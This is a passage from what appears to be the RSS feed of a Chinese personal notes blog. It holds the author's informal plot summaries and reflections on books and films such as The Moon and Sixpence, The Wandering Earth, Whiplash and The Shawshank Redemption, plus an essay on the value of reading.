我如此害怕阅读的人，因为他们的榜样是伟人，就算做不到，退一步也还是一个，我远不及的成功者。
我害怕阅读的人，他们知道「无知」在小孩身上才可爱，而我已经是一个成年的人。
我害怕阅读的人，因为大家都喜欢有智慧人。
我害怕阅读的人，他们能避免我要经历的失败。
我害怕阅读的人，他们懂得生命太短，人总是聪明得太迟。
我害怕阅读的人，他们的一小时，就是我的一生。
我害怕阅读的人，尤其是，还在阅读的人。
这篇文章是台湾奥美给天下文化做的长文案，在网上广为流传。
文字很震撼，把不读书人的内心的怯懦写了出来，
不知你有什么反应，但我看完后有一种读书的迫切感，害怕那些阅读的人把我越落越远。
“一跟他们谈话，我就像一个透明的人，苍白的脑袋无从隐藏。”
我对这种感受有切身体会。
我一度自认为也算涉猎极广的人，但是因为工作原因，难免会和不同领域的高手对招。
有次聊合作，自己深度备课的谈资在那些高人眼里，不过是初阶小白掌握的东西，而且结合到事情上还往往张冠李戴。
当他们质问的眼神盯着我，“我就像一个透明的人，苍白的脑袋无从隐藏”。
也许，不读书造成的这种无地自容的情形在生活中也有很多，
只不过和我们对话的那些阅读的人不会像领导或专家一样咄咄逼人，
他们只会在内心中暗暗鄙视：原来这是个不学无术的家伙。
而我们自己反而不觉，仍然在那里滔滔不绝地暴露自己的无知。
其实你在生活中戴着面具表演的时候，深知自己口中说出的那些话连自己都不知道是什么东西，
内心深处尚存那么一丝的怯懦和心虚，说明你还没有在虚伪的生活里完全迷失。
而读书，则是可以帮你走出这种困扰的唯一途径。</description>
    </item>
    
    <item>
      <title>《斗罗大陆 龙王传说》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/fantasy/%E6%96%97%E7%BD%97%E5%A4%A7%E9%99%86-%E9%BE%99%E7%8E%8B%E4%BC%A0%E8%AF%B4/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/fantasy/%E6%96%97%E7%BD%97%E5%A4%A7%E9%99%86-%E9%BE%99%E7%8E%8B%E4%BC%A0%E8%AF%B4/</guid>
      <description>《斗罗大陆 龙王传说》 </description>
    </item>
    
    <item>
      <title>《斗罗大陆》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/fantasy/%E6%96%97%E7%BD%97%E5%A4%A7%E9%99%86/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/fantasy/%E6%96%97%E7%BD%97%E5%A4%A7%E9%99%86/</guid>
      <description>《斗罗大陆》 </description>
    </item>
    
    <item>
      <title>《旅行到宇宙边缘》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E6%97%85%E8%A1%8C%E5%88%B0%E5%AE%87%E5%AE%99%E8%BE%B9%E7%BC%98/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E6%97%85%E8%A1%8C%E5%88%B0%E5%AE%87%E5%AE%99%E8%BE%B9%E7%BC%98/</guid>
      <description>《旅行到宇宙边缘》 </description>
    </item>
    
    <item>
      <title>《时间的风景》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E6%97%B6%E9%97%B4%E7%9A%84%E9%A3%8E%E6%99%AF/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E6%97%B6%E9%97%B4%E7%9A%84%E9%A3%8E%E6%99%AF/</guid>
      <description>《时间的风景》 </description>
    </item>
    
    <item>
      <title>《明日边缘》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%98%8E%E6%97%A5%E8%BE%B9%E7%BC%98/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%98%8E%E6%97%A5%E8%BE%B9%E7%BC%98/</guid>
      <description>《明日边缘》 人生在世只有两位师傅，分别是痛苦和恐惧。
两人被追杀，乘救生艇逃跑，其中一个掉进了水中，爬上了岸，看到一辆卡车便坐了进去，他拿起了副驾驶上的红酒和三明治，吃着喝着，和观众一起看着水中的两艘船你追我赶。虽全程无话，但却非常有意思。</description>
    </item>
    
    <item>
      <title>《星际迷航》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%98%9F%E9%99%85%E8%BF%B7%E8%88%AA/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%98%9F%E9%99%85%E8%BF%B7%E8%88%AA/</guid>
      <description>《星际迷航》 </description>
    </item>
    
    <item>
      <title>《月亮与六便士》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/novel/%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/novel/%E6%9C%88%E4%BA%AE%E4%B8%8E%E5%85%AD%E4%BE%BF%E5%A3%AB/</guid>
      <description>《月亮与六便士》 主要内容 一个有着稳定的工作，漂亮妻子、可爱儿女的四十多岁中年人，为了自己沉睡了多年的梦想——画画，而离开这个幸福而平凡的家庭，独自一人来到一个破房间中创作。后来生病了，将死之际被好人朋友发现，这个好人朋友将他带到了自己家，几乎逼迫自己的妻子照顾这个垂危的人，在这期间，他抢占好人朋友的画室，朋友最终忍无可，终于是在某一天让他离开，然后他就带着这位好人朋友的妻子离开了。好人朋友很后悔，像舔狗一样祈求他的妻子回到他的生边，但这没用。
夏天来了，好人朋友的妻子自杀了，是被中年人逼的，好人朋友悲痛万分，安葬后，他回到了自己的家乡，回家之前还准备带着这位中年人，想给他找个住的地方，中年人回绝了，随便将那副好人妻子的裸体画送给了他。
没有了好人朋友的照料，中年人的生活过的很苦，几乎就像一个乞丐一般，但他从来不抱怨，不将这些苦难当作一回事。一次偶然间，他来到了一座孤岛，他说：”这才是我梦寐以求的地方，我本该属于这里，我似乎在这里呆过！“
在岛上的几年，他依旧过的很苦，但却很快乐，在这里，它可以安心的画画。
作者在这里还讲了一个医生的故事，也是在不经意间看到了一个地方，激起了内心中那种美妙的自由感，而决定放弃自己光明的前途，从此生活在了这个自己心中像家一样的地方。
之后，他娶了一个名叫阿塔的女孩，他们幸福的生活着。一直到他因病去世，去世之前，他在他们住的房子的墙壁上画了一幅惊天之作，后来被阿塔烧毁了。
在他去世之后，他的画出名了，值很多钱。现在，当初那些看过他的画的人都像作者一样——后悔当时没有买下他的画。
感想 后悔的人们 在斯特里克兰成名之前，几乎没有人看得懂他的画，人们都唾弃他，但但他去世之后，他的画出名了，这个时候的他们依旧看不懂他的画，但却因为他的画值足够多的金钱，而后悔当初为什么不多买几幅他的画。
斯特里克兰 斯特里克兰这个人，他冷漠，决断，他为了画画而抛下了妻子，孩子，抛下了这个家庭，仅凭这些，他也就不是一个好父亲，但抛开这一点，他让我佩服，他完全不受色欲的影响，不受道德的约束，不在意别人的看法，对舒适不感兴趣，毫不在意生活中的苦难，不受人恩惠，却总有人恩惠他，一心画画。
亚伯拉罕 亚伯拉罕原本是一个前途无量的医生，但在在经过亚历山大港的时候，他如同天启，就好像他的心被说明揪住了，突然之前满心欢喜，一种美妙的自由感。他感觉就像回到了家里，一下子打定主意，此生就在亚历山大港生活了。
小说结尾 “我”陈述了斯特里克兰的人生。
他求仁得仁，得其所哉，为了自己的梦想，在塔希提以一种文明人无法理解、他自己很快乐的方式，结束了人生。
而罗伯特-思特里克兰，代表文明社会，做出了评断：上帝的磨盘转动很慢，但是磨得很细。这就是道貌岸然的说，斯特里克兰（因为抛弃妻子），恶有恶报。
”我“想反驳他，但我止住了。
而这里的亨利叔叔，只是”我“的一个例证。
”我“很显然是站在思特里克兰一边的，对道貌岸然用各类引语评断他人行为，非常厌恶。
佳句   一个作者，应该从写作本身，从思想宣泄中获得快乐，至于其他，都不必介意，一本书或成功或失败，或赞誉或诋毁，他都应该淡然一笑
  再过去的那些日子，我们都羞于表达，因为怕人嘲笑，所以尽量约束自己，不让人觉得骄傲自大。
  生活如此平静，始终沉默，不动声色，你会突然心生烦恼，感到莫名的不安，这样的安逸总让我惊惧，我的血液里有一种强烈的冲动，渴望一种桀骜不驯的旅程，我的心渴望更加惊险的生活
  卑鄙与高尚，邪恶与善良，仇恨与热爱，可以并存于同一颗心灵中。
  我爱她，远远胜过爱自己，要我说，爱情中如果考虑自尊，只能说明你更爱自己。
  恐惧会让人变得残酷无情。
  精彩片段 布拉奇与斯特洛夫的美好生活  尽管如此，当我回想在巴黎度过的这个冬天，给我留下美好记忆的，依然是德克.斯特洛夫。他的小家，始终迷人。 他和他妻子，就像-幅让人感觉快意的画，他对她天真的爱，总是带着刻意的优雅。尽管他的举止依然可笑，但他的真情实意还是会打动你。我能理解他妻子对他的感觉，很高兴见她温柔以待。如果她有幽默感，她一定会觉得好笑，因为他把她放在了宝座上，当偶像一样膜拜，但即便她感到好笑，她也必然被深深感动。他是忠贞不渝的爱人，当她老了，失去了丰满的线条和美丽的身材，对他来说，她也依然没变。在他眼里，她永远是世上最美的女人。他们的生活，安然有序，令人愉悦。他们的房间，只有一个画室，一间卧室， 和一 一个小厨房。所有的家务，都由斯特洛夫夫人包揽;当德克在画他那些糟糕的画时，她就去市场买菜，做午饭，缝补衣服，整天像勤快的蚂蚁般忙忙碌碌;到了晚上，她坐在画室里，又是缝缝补补，而德克弹奏着曲子，我敢肯定，她定听不懂。
  我想起在蒙马特那间温馨的画室里，斯特洛夫和他的妻子，这幸福的一对，他们诚实善良，热情好客，但这种生活却被一桩偶然的事件无情地击碎，在我看来真是残酷
但最残忍的是，它发生了和没发生几乎一样，世界已然继续，他是一时悲痛，而非爱的深沉，至于布兰奇，无论她最初带着怎样光明的希望和梦想，死了就跟没来过这世界上一样，仿佛一切都很空虚，没有意义。
 斯特里特兰的美好生活  他画的不是很多，整天在山上游荡，在溪水里洗澡，他坐在海边眺望环礁湖，太阳下山就去看看莫里阿岛。他也经常坐在礁石上钓鱼。他喜欢在码头上闲逛，和当地人聊天。他很安静，招人喜欢，每天吃完晚饭，他就和阿塔一起回测楼。
离此处不远有一条小溪，他经常在哪里洗澡，有时候会有鱼群出现，当地人会拿着长矛赶来，吵吵嚷嚷，把正向大海游去的鱼叉上来。隔三岔五，他也会去海滩，带回来一筐五颜六色的小雨，阿塔就用椰子油把鱼炸了，有时还会配上一大只龙虾，偶尔，她也会做一盘美味的大螃蟹，这种螃蟹经常在你脚下爬来爬去。山上长着野橘，阿塔经常和村里两三个伙伴儿一起去采摘，总是满载而归，带回来的橘子连着绿叶，甘甜爽口。很快，椰子成熟了，阿塔的表弟、堂姐堂妹一拥而上，全爬上树，将打吧的椰果扔下来。他们把椰子剖开，放在太阳下晾晒。晒干了就把椰肉割下取出，装进口袋。女人们就把他们拿到附近的村子里的商人那儿，换回大米、肥皂、罐头肉和一点钱。
 斯特里特兰的自信  斯特里特兰在库特拉斯医生那里得知自己生病之后，他送给了这个医生一幅画，并说道：&amp;ldquo;现在可能没什么，将来有一天，你会很高兴拥有它！&amp;rdquo;
对自己的画，这是何等的自信？
 阿塔的三句话  当阿塔知道斯特里克兰得病之后，她说：
“他们不会把你弄走吧？”</description>
    </item>
    
    <item>
      <title>《死亡诗社》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%AD%BB%E4%BA%A1%E8%AF%97%E7%A4%BE/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%AD%BB%E4%BA%A1%E8%AF%97%E7%A4%BE/</guid>
      <description>《死亡诗社》 </description>
    </item>
    
    <item>
      <title>《永无止境》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%B0%B8%E6%97%A0%E6%AD%A2%E5%A2%83/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%B0%B8%E6%97%A0%E6%AD%A2%E5%A2%83/</guid>
      <description>《永无止境》 艾迪，一个失败者，某一天，女朋友跟他分手后，他走在大街上偶遇一个买药的朋友，这个朋友给了他一颗药，他吃了下去，大脑瞬间开发到了百分之百，之后和房东暧，回到房间昧收拾杂乱的屋子。</description>
    </item>
    
    <item>
      <title>《河西走廊》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E6%B2%B3%E8%A5%BF%E8%B5%B0%E5%BB%8A/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E6%B2%B3%E8%A5%BF%E8%B5%B0%E5%BB%8A/</guid>
      <description>《河西走廊》 </description>
    </item>
    
    <item>
      <title>《流浪地球》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%83/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%B5%81%E6%B5%AA%E5%9C%B0%E7%90%83/</guid>
      <description>《流浪地球》 太阳正在急速老化持续膨胀，一百年后，太阳会膨胀到吞没震哥个地球。
三百年后，太阳系将不复存在。
面对灾难，人类异常团结，人类决定，将整个地球推离太阳系，为人类寻找新家园，人类在地球上建造了一万个行星发动机，为飞离太阳系提供动力，这个计划叫做流浪地球计划。
在飞离太阳系之前，由于地球表面的环境的不断恶化 零下 80+℃，导致人类无法在地球表面生存，为此，人类在每个行星发动机下面都建造了地下城，使得人类可以继续生活。
刘启带着韩朵朵偷偷来到了地面上。
刘培强在空间站工作了十七年，在地球也飞到木星的位置后，终于离职了
因木星引力太大，地球上的部分行星发动机遭到其引力的影响，导致四千七百多座星发动机出现停机故障。
因空间站调配全部资源进行地面辅助救援工作，为此空间站上的人都需要休眠，使得空间站进入低功耗模式。
这时的刘培强已经发现空间站的智能机器莫斯似乎想叛逃——空间站距离地球越来越远。
韩子昂他们几个在返回避难区的路程中，被迫接受了与 CN171-11 救援队一起运送“火石”的危险任务。
运送火石的过程中，遭到了第二次强震，韩子昂与另一个成员牺牲了。
刘启、韩朵朵和 Tim 与运送火石的大部队分离，这里充分的体现了你有用才留着你，没用了没人会管你。
刘启找到一辆运输车之后，遇到了李一一，同时接到新任务，将火石送到苏拉威西，重新组织 CN171-11 救援队一起救援苏拉威西。
行星发动机大部分重启完毕，在众人都以为地球已经脱离危险的时候，空间站的莫斯说出了真相：“在救援行动启动后的 0.42 秒，莫斯就已经推演本次救援的结果，联合政府虽早已知晓，但仍竭尽全力组织救援，但这注定是一场徒劳的救援，空间站的撤离，就代表着救援行动的失败。”
这时候的木星的引力远远超过地球上的发动机的总推力。
地球上的人类被放弃了， 这种世界末日将要来临的感觉，我不知道那是一种怎么样的绝望。
不知道为什么，我现在很兴奋，这种前所未有的感觉令我的血液在燃烧。
在这关键的石刻，刘启突然想到了小时候与父亲的对话，最后想到了一个方法——点燃木星，让木星的冲击波冲向地球，使得地球被冲击波推理木星的引力范围。
说实话，一个小屁孩能想到的科学知识，为毛那些世界顶尖科学家想不到&amp;hellip;.可能这就是剧情需要吧。
之后才知道这个救援方案已经被以色列的顶尖科学家提出过，但救援成功的概率为 0.
但刘培强并没有放弃，最终让韩朵朵获得了在世界广播的能力，说了几句比较啰嗦的话之后&amp;hellip;&amp;hellip;
所有的车辆开始往苏拉威西发动机方向赶，说实话，这里让人挺震撼的。
我虽然不相信人类的人性真会这样做，但我希望它可以这样做
老何为了找到那啥牺牲了。
tim 为了将刘启从那啥拉回来也在鬼门关走了一走
在只剩下最后十五分钟的时候，其他人来帮忙了——推那啥玩意
最后还是差五千公里&amp;hellip;..
刘培强在这个时候决定牺牲空间站，空间站上的燃料可以达到五千公里，刚好可以点燃木星，原本我以为他会带着空间站上休眠仓一起赴死，没想到这玩意还可以解体&amp;hellip;..
让人类永远保持理智，确实是一种奢求。
刘培强决定牺牲自己，但刘启慌了，虽然他表面讨厌自己的父亲，但这个时候刘启慌了&amp;hellip;..很多人也许觉得刘启自私，这种时候还想着个人感情，但我觉这才合理，毕竟他还只是个孩子。
我以为刘启死了，没想到活了下来&amp;hellip;.明明头盔都破碎了，当然，着也是我希望看到的，毕竟我可不希望只剩韩朵朵一个人活了下。
着电影总体来说挺不错的，给我感觉就是——希望那一刻能够来临！</description>
    </item>
    
    <item>
      <title>《浪潮》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%B5%AA%E6%BD%AE/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%B5%AA%E6%BD%AE/</guid>
      <description>《浪潮》 </description>
    </item>
    
    <item>
      <title>《爆裂鼓手》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%88%86%E8%A3%82%E9%BC%93%E6%89%8B/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%88%86%E8%A3%82%E9%BC%93%E6%89%8B/</guid>
      <description>《爆裂鼓手》
一个年轻的鼓手正在勤奋的练习。
安德鲁被弗莱彻选为乐队新替补，众人中只有他被选上，他心中一定和开心，
安德鲁还成功约了喜欢的女孩一起吃披萨
安德鲁被弗莱彻放鸽子，但后来发现并灭有，六点的时候光头给了康纳利一份谱子，但因安德鲁迟到了，因此他 并没有。。
这光头很严格，但为什么喜欢开别人玩笑，逗别人玩呢？
安德鲁被弗莱彻扔椅子，扇耳光，当众羞辱。
安德鲁带伤练习打鼓。
安德鲁与喜欢的女孩约会
弗莱彻喜怒无常。
安德鲁把别人的乐谱弄丢了，但他背过谱子，他上了，他们获得了第一名。
坦纳你来干嘛了今天是核心排练没时间调教替补，弗莱彻说。留下坦纳一脸懵逼。
弗莱彻全看表现，今天你行，你就取代他上，明天他行，他就取代你。
我宁愿酗酒吸毒 34 岁就家破人亡，成为人们晚餐桌上的话题，也不愿意腰缠万贯满面红光的活到 9 0 岁，但是没人记得我
安德鲁以为他是核心乐手，没想到再弗莱彻心中不过是个临时核心。现在弗莱彻找到了另一个也会安德鲁所会的双倍慢摇，弗莱彻为了让音乐会达到最高水准，让他们竞争，并选出最适合的乐手，但安德鲁却慌了，他怕康纳利会取代他。他输了，他被替代了，他不服
安德鲁决定和女友妮可分手，为了他那梦想。
疯子吧，这弗莱彻，压迫式训练。
安德鲁为了当核心驾车拿鼓锥，但在返回的途中出车祸了，他依旧拿着鼓锥跑向表演现场，弗莱彻都惊讶。
安德鲁在表演途中坚持不了，弗莱彻说 ：“你玩完了。”安德鲁冲上去打弗莱彻。
有人给安德鲁说肖恩不是上出车祸死的，而是被弗莱彻逼成抑郁症杀死的。
安德鲁的父亲不想看到儿子被弗莱彻逼成像肖恩这样，因此找了律师控告弗莱彻，使他失业。安德鲁对此犹豫了，但最终还是决定让弗莱彻事业。
安德鲁在酒吧偶遇弗莱彻，被弗莱彻的一席话感动，大致意思就是我曾经在学校并不是为了指挥，而是为了逼迫，并再次说出来理查帕克的例子。
出了就把后，弗莱彻说出了目的——他想让安德鲁在音乐节上当他的鼓手。
“康纳利呢”安德鲁回答。
他一直都是我用来激发你动力的而已。弗莱彻回答
看到这里我已经开始觉得这光头还真不错，虽然之前我就已经觉得有着一方面的考虑，但当他真说出目的的时候，还是觉得弗莱彻的教育理念从某个方面讲，确实有用。
安德鲁答应了弗莱彻，并邀请前女友妮可观看他的爵士乐表演，但现在的妮可已经有男朋友了。哈哈哈哈，看到这我直接心情愉悦，这部活该吗？有些人，一旦错过，就不在了。
音乐节来了，演出开始，但谱子确实错的，弗莱彻原来早已知道谁让他失去了职位，早已开始报复，演出结束过后，安德鲁到休息室拥抱父亲，父亲让他回家， 但他转身便来到了台上，直接无视弗莱彻，开始 solo，中途弗莱彻说了一句：“我把你眼球挖出来”，被安德鲁用那啥打了一下，这一下真痛快！
安德鲁继续即兴，越来越快，弗莱彻这次真的震惊了。
最后一刻，弗莱彻和安德鲁相视一笑。在他们的眼神对望和表情变化中，我看到了对音乐执着追求的狂热和艺术上不受任何干扰的默契。这种过程，非常短暂，短到让人无法相信，但是这，可能就是艺术的魅力吧。</description>
    </item>
    
    <item>
      <title>《猫鼠游戏》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%8C%AB%E9%BC%A0%E6%B8%B8%E6%88%8F/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%8C%AB%E9%BC%A0%E6%B8%B8%E6%88%8F/</guid>
      <description>《猫鼠游戏》 </description>
    </item>
    
    <item>
      <title>《白日梦想家》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%99%BD%E6%97%A5%E6%A2%A6%E6%83%B3%E5%AE%B6/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%99%BD%E6%97%A5%E6%A2%A6%E6%83%B3%E5%AE%B6/</guid>
      <description>《白日梦想家》 沃尔特的生活似乎不太尽人意的感觉，这不是我们大多数人的生活么？
沃尔特在网上看到一个有好感的人，她叫谢尔，却不敢让她知道，日常生活中，这不就是大多数人在遇到自己喜欢的人后，那种犹豫、害怕、紧张，不知所措的感觉吗？
沃尔特正在打电话，然后他突然像钢铁侠那样从窗户跳进房子里，救了一条狗出来&amp;hellip;.科幻片既视感？过了会儿发现，原来是白日梦。我在生活中也会经常幻想自己是超人、有超能力，然后去干一件大事情，最后被我喜欢的人所崇拜，并在一起，然后，你又回到了现实，才发现这只是幻想罢了。
仅仅几分钟，我似乎已经看到了以后我的未来？幻想着一切，但却一无所有。
他是《生活》杂志底片资产部的一名员工，公司现在急需肖恩寄来的底片作为杂志的封面，但他似乎并没有找到这张底片，因此，他需要先找到肖恩。
他终于鼓起勇气和谢尔搭上了话。
第一次白日梦，幻想自己变成了超人，并在一座失火的教堂中救出小狗，出来后便遇到了谢尔。
第二次白日梦，幻想谢尔的偶像从雪山走到她的旁边。
第三次白日梦，幻想自己给谢尔造了一个金色的雕塑。
第四次白日梦，幻想和主管打架。
第五次白日梦，幻想自己喜欢的人和他表白&amp;hellip;.
他与喜欢的人一起去接她的儿子
这里有个细节，华特在教她的儿子滑板的时候，每次用滑板做一个帅气的动作都会看向她
华特似乎是受到了某种启示，坐飞机来到了格陵兰岛的努克镇寻找肖恩。
胖子开直升机送华特到一艘船上寻找肖恩，在这里他应该又做了一个白日梦&amp;hellip;但不同的是这次华特似乎没有发呆。
之后到了船的上空，胖子让华特跳到船上去，这时候的直升机的下方是一艘渔船和接他的救生艇，他跳了，但跳反了。鲨鱼来了，但鲨鱼居然没有吃掉它&amp;hellip;我开始怀疑这是不是他做的白日梦了。
华特上了一艘渔船到的冰岛，骑上了自行车，来到了火山，继续寻找肖恩。
风景美，人也自由。
火山喷发了，华特似乎看到肖恩站在直升机上拍风景照。
华特被胡子哥裁掉了，谢尔也是。
华特来到了谢尔的住处寻找谢尔，顺便将滑板送给他的孩子。
开门了，是一个人男人，“我找谢尔”华特说道
男人随即转身去叫谢尔，“honey！有人找你。”，我觉得这个男的应该不是谢尔的前夫，而是哥哥之类的？
华特转身，放下了滑板，独自一人走了。
生活中，也许我们也遇到过。
回到家，华特很消沉，无意间发现了一张线索和他们家的钢琴很像，便问了母亲。
在母亲的鼓励下，他踏上了去往阿富汗的旅程。
华特在阿富汗人的带领下，来到了喜马拉雅山的山腰，因某种原因，华特独自一人登山，在和暗恋网的工作人员童话的过程中，遇到了肖恩。
肖恩告诉华特，他把那张照片放到了送给华特的钱包里，但遗憾的是，华特在这之前已经把钱包扔掉了，虽然我并不知道他为什么要扔掉。
”有时候，我并不想为了拍照而拍照，只想享受那一刻。“肖恩说道。
肖恩叫上华特去踢球。
夕阳下，一群人在玩乐，自由，快乐，安然。
回到家，他拿到了一笔卖掉钢琴的巨款，并找回了肖恩送给他的钱包，这个钱包被他妈妈从垃圾桶里捡了出来。
他应该很后悔扔掉了钱包，但现在找回来了，他很开心。
他将底片拿回了《生活》杂志的公司，胡子哥也将底片作为了最后一刊《生活》杂志的封面。
华特拿到了遣散费后，在人群中无意间看到了谢尔，并追了上去。聊了会儿，原来上次只是谢尔的前夫在她家修冰箱，并没有破镜重圆。
华特主动的约了谢尔看表演，希尔答应了。
他们一起走在大街上，看到了最后一刊的《生活》杂志，封面是华特——拿着仔细底片观察。
“要不要买一本”谢尔说。
“我可能待会才来买，我只想装装酷，不想马上买一本。”华特回答。
片尾
华特牵起了谢尔的手。</description>
    </item>
    
    <item>
      <title>《秘密特工》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%A7%98%E5%AF%86%E7%89%B9%E5%B7%A5/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%A7%98%E5%AF%86%E7%89%B9%E5%B7%A5/</guid>
      <description>《秘密特工》 人生在世只有两位师傅，分别是痛苦和恐惧。
两人被追杀，乘救生艇逃跑，其中一个掉进了水中，爬上了岸，看到一辆卡车便坐了进去，他拿起了副驾驶上的红酒和三明治，吃着喝着，和观众一起看着水中的两艘船你追我赶。虽全程无话，但却非常有意思。</description>
    </item>
    
    <item>
      <title>《红猪》国语版</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%BA%A2%E7%8C%AA%E5%9B%BD%E8%AF%AD%E7%89%88/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%BA%A2%E7%8C%AA%E5%9B%BD%E8%AF%AD%E7%89%88/</guid>
      <description>《红猪》国语版 小孩子和小孩都好可爱，这些空贼确定是来抓人质的吗？
这部电影女主的国语配音真的太美妙了，是那种可以让人心安的声音和调调
男主中了魔咒，脸变成了猪头
红猪离开了吉娜，吉娜舍不得他
吉娜说：“因为我给自己下了赌注，我打赌，如果我在这座花园的时候，那个人能来找我，我这辈子就会跟着他，可是那个傻瓜，它只会晚上在店里找我。&amp;quot;
然后，他来了，但他似乎又走了
里面的人对女人很好，很尊重女人。
治愈的情节真的很多。
吉娜一直深爱着马克</description>
    </item>
    
    <item>
      <title>《绿皮书》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%BB%BF%E7%9A%AE%E4%B9%A6/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E7%BB%BF%E7%9A%AE%E4%B9%A6/</guid>
      <description>《绿皮书》 </description>
    </item>
    
    <item>
      <title>《肖申克的救赎》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E8%82%96%E7%94%B3%E5%85%8B%E7%9A%84%E6%95%91%E8%B5%8E/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E8%82%96%E7%94%B3%E5%85%8B%E7%9A%84%E6%95%91%E8%B5%8E/</guid>
      <description>《肖申克的救赎》 银行家杜弗兰被指控杀害妻子和及其情人。
监狱里的人欢迎新人，他们打赌哪位新人最先崩溃。
胖子崩溃了，被监狱长拖出牢房殴打，最终死亡。没人记得他的名字。
监狱里，只能男的和男的做那种事。有人问杜弗兰：
”你名草有主了吗“
”真难追“
他和监狱长做了个交易。并且让监狱长请他的兄弟们喝酒，享受着这短暂的自由。
此后，杜弗兰利用他的知识帮狱警们避税，获得了好的工作，果然，知识才是力量，你的知识足够重要，足够让你成为特殊。
老头在肖申克监狱待了十年，获释的时候居然想杀掉一个人，就为了在这个监狱继续呆下去。
监狱是个怪地方，起初你对监狱恨之入骨，然后你对它习以为常，时间够久之后，你会变得无比依赖这里，这就是制度化。
老头出狱了，获得了住所，和一份超市包装员的工作，但他工作的很辛苦，以为他的手有关节炎。晚上睡觉会时常惊醒，做噩梦，他是一个老人。他收拾好东西这边离开这个令他担惊受怕的地方。他自杀了。瑞德说：
”他还不如老死在肖申克监狱。“
杜弗兰给州长写信，目的是为了让州长在肖申克监狱建一个图书馆，六年后，终于是让州长拨款了两千美刀，并且还捐赠了很多书籍。
安迪越狱了，整整二十年。这就是知识的重要性。
监狱里的友情。
自由的重要性
希望的重要性
学识的重要性
坚持的重要性</description>
    </item>
    
    <item>
      <title>《苏菲的世界》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/philosophy/%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C/</guid>
      <description>《苏菲的世界》 凌晨，初次看完《苏菲的世界》这本书。
这本书真是越到后面越有趣，小说与哲学科普的完美结合；并且充满了悬疑的情节和有趣的脑洞。
作者让小说中的苏菲发现了自己只是书中的一个虚拟人物后，非常的接受不了，并和她的哲学老师密谋逃脱这个虚拟世界。
